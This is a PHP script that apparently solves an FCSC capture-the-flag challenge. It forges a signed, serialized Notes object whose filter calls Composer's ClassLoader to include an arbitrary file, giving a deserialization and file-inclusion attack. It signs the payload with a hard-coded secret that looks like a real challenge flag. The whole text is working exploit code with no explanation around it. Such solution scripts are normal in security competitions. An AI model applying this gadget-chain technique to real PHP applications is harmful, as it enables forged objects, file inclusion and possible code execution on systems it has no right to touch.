<?php
require __DIR__ . '/../secure-mood-notes/src/main_notes_app/vendor/autoload.php';

use App\Model\Notes;
use Composer\Autoload\ClassLoader;

//$secret = 'FCSC{FAKE_FLAG1}';
$secret = 'FCSC{9c3c34c030a9d6d8}';
$path = '/path/to/shared.mood.notes';

$loader = new ClassLoader();
$loader->addClassMap([
    'CNF' => $path,
]);

$notes = new Notes([]);
$notes->all_notes = ['CNF'];
$notes->filters = [
    'incl' => [$loader, 'loadClass'],
];

$ser = serialize($notes);
$signed = $ser . hash_hmac('sha256', $ser, $secret);
echo urlencode(base64_encode($signed)), PHP_EOL;
